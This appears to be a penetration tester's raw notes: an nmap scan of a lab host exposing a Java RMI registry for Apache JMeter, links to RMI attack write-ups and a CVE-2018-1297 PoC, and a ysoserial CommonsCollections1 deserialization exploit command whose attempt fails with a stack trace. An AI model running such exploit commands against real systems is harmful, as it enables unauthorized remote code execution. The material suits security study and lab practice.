

Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-01 03:46 EDT
Nmap scan report for 192.168.0.242
Host is up (0.0025s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 29:12:71:4f:29:21:60:74:ee:1a:77:74:c4:a6:5d:9d (DSA)
|   2048 a5:ad:59:51:54:75:0b:d7:e0:78:2b:20:cc:4f:76:34 (RSA)
|   256 0f:7d:a0:23:d4:a3:c2:d1:af:3c:13:dd:c0:75:20:45 (ECDSA)
|_  256 fc:99:ba:3d:56:07:f4:b1:ce:3b:0d:c0:48:27:cb:f2 (ED25519)
80/tcp    open  http        Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
1099/tcp  open  java-rmi    Java RMI Registry
| rmi-dumpregistry: 
|   JMeterEngine
|      implements java.rmi.Remote, org.apache.jmeter.engine.RemoteJMeterEngine, 
|     extends
|       java.lang.reflect.Proxy
|       fields
|           Ljava/lang/reflect/InvocationHandler; h
|             java.rmi.server.RemoteObjectInvocationHandler
|             @192.168.0.242:37738
|             extends
|               java.rmi.server.RemoteObject
|     Custom data
|       Classpath
|         file:/usr/src/apache-jmeter-3.3/lib/accessors-smart-1.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/asm-5.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/bsf-2.4.0.jar
|         file:/usr/src/apache-jmeter-3.3/lib/bsh-2.0b5.jar
|         file:/usr/src/apache-jmeter-3.3/lib/bshclient.jar
|         file:/usr/src/apache-jmeter-3.3/lib/caffeine-2.5.5.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-codec-1.10.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-collections-3.2.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-dbcp2-2.1.1.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-io-2.5.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-jexl-2.1.1.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-jexl3-3.1.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-lang3-3.6.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-math3-3.6.1.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-net-3.6.jar
|         file:/usr/src/apache-jmeter-3.3/lib/commons-pool2-2.4.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/dec-0.1.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/dnsjava-2.1.8.jar
|         file:/usr/src/apache-jmeter-3.3/lib/freemarker-2.3.23.jar
|         file:/usr/src/apache-jmeter-3.3/lib/geronimo-jms_1.1_spec-1.1.1.jar
|         file:/usr/src/apache-jmeter-3.3/lib/groovy-all-2.4.12.jar
|         file:/usr/src/apache-jmeter-3.3/lib/hamcrest-core-1.3.jar
|         file:/usr/src/apache-jmeter-3.3/lib/hamcrest-date-2.0.4.jar
|         file:/usr/src/apache-jmeter-3.3/lib/httpasyncclient-4.1.3.jar
|         file:/usr/src/apache-jmeter-3.3/lib/httpclient-4.5.3.jar
...
|         file:/usr/src/apache-jmeter-3.3/lib/httpcore-4.4.7.jar
|         file:/usr/src/apache-jmeter-3.3/lib/httpcore-nio-4.4.7.jar
|         file:/usr/src/apache-jmeter-3.3/lib/httpmime-4.5.3.jar
|         file:/usr/src/apache-jmeter-3.3/lib/jcharts-0.7.5.jar
|         file:/usr/src/apache-jmeter-3.3/lib/jcl-over-slf4j-1.7.25.jar
|         file:/usr/src/apache-jmeter-3.3/lib/jodd-core-3.8.6.jar
|         file:/usr/src/apache-jmeter-3.3/lib/jodd-lagarto-3.8.6.jar
|         file:/usr/src/apache-jmeter-3.3/lib/jodd-log-3.8.6.jar
|         file:/usr/src/apache-jmeter-3.3/lib/jodd-props-3.8.6.jar
|         file:/usr/src/apache-jmeter-3.3/lib/jorphan.jar
|         file:/usr/src/apache-jmeter-3.3/lib/json-path-2.4.0.jar
|         file:/usr/src/apache-jmeter-3.3/lib/json-smart-2.3.jar
|         file:/usr/src/apache-jmeter-3.3/lib/jsoup-1.10.3.jar
|         file:/usr/src/apache-jmeter-3.3/lib/jtidy-r938.jar
|         file:/usr/src/apache-jmeter-3.3/lib/junit-4.12.jar
|         file:/usr/src/apache-jmeter-3.3/lib/log4j-1.2-api-2.8.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/log4j-api-2.8.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/log4j-core-2.8.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/log4j-slf4j-impl-2.8.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/mail-1.5.0-b01.jar
|         file:/usr/src/apache-jmeter-3.3/lib/mongo-java-driver-2.11.3.jar
|         file:/usr/src/apache-jmeter-3.3/lib/oro-2.0.8.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ph-commons-8.6.6.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ph-css-5.0.4.jar
|         file:/usr/src/apache-jmeter-3.3/lib/rhino-1.7.7.1.jar
|         file:/usr/src/apache-jmeter-3.3/lib/rsyntaxtextarea-2.6.1.jar
|         file:/usr/src/apache-jmeter-3.3/lib/serializer-2.7.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/slf4j-api-1.7.25.jar
|         file:/usr/src/apache-jmeter-3.3/lib/slf4j-ext-1.7.25.jar
|         file:/usr/src/apache-jmeter-3.3/lib/tika-core-1.16.jar
|         file:/usr/src/apache-jmeter-3.3/lib/tika-parsers-1.16.jar
|         file:/usr/src/apache-jmeter-3.3/lib/xalan-2.7.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/xercesImpl-2.11.0.jar
|         file:/usr/src/apache-jmeter-3.3/lib/xml-apis-1.4.01.jar
|         file:/usr/src/apache-jmeter-3.3/lib/xmlgraphics-commons-2.2.jar
|         file:/usr/src/apache-jmeter-3.3/lib/xmlpull-1.1.3.1.jar
|         file:/usr/src/apache-jmeter-3.3/lib/xpp3_min-1.1.4c.jar
|         file:/usr/src/apache-jmeter-3.3/lib/xstream-1.4.10.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_components.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_core.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_ftp.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_functions.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_http.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_java.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_jdbc.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_jms.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_junit.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_ldap.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_mail.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_mongodb.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_native.jar
|         file:/usr/src/apache-jmeter-3.3/lib/ext/ApacheJMeter_tcp.jar
|_        file:/usr/src/apache-jmeter-3.3/lib/junit/test.jar
37738/tcp open  rmiregistry Java RMI
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/

CVE: http://pentestit.com/apache-jmeter-rmi-remote-code-execution-vulnerability-poc-cve-2018-1297/

java -cp ysoserial-master-55f1e7c35c-1.jar ysoserial.exploit.RMIRegistryExploit 192.168.0.242 1099 CommonsCollections1 'ping -c2 192.168.1.36'
java.rmi.ServerException: RemoteException occurred in server thread; nested exception is: 
	java.rmi.AccessException: Registry.bind disallowed; origin /192.168.1.36 is non-local host
	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:389)
	at sun.rmi.transport.Transport$1.run(Transport.java:200)
	at sun.rmi.transport.Transport$1.run(Transport.java:197)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
	at java.rmi/sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:283)
	at java.rmi/sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:260)
	at java.rmi/sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)
	at java.rmi/sun.rmi.registry.RegistryImpl_Stub.bind(RegistryImpl_Stub.java:68)
	at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:77)
	at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:71)
	at ysoserial.secmgr.ExecCheckingSecurityManager.callWrapped(ExecCheckingSecurityManager.java:72)
	at ysoserial.exploit.RMIRegistryExploit.exploit(RMIRegistryExploit.java:71)
	at ysoserial.exploit.RMIRegistryExploit.main(RMIRegistryExploit.java:65)
Caused by: java.rmi.AccessException: Registry.bind disallowed; origin /192.168.1.36 is non-local host
	at sun.rmi.registry.RegistryImpl.checkAccess(RegistryImpl.java:350)
	at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:69)
	at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:468)
	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:300)
	at sun.rmi.transport.Transport$1.run(Transport.java:200)
	at sun.rmi.transport.Transport$1.run(Transport.java:197)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
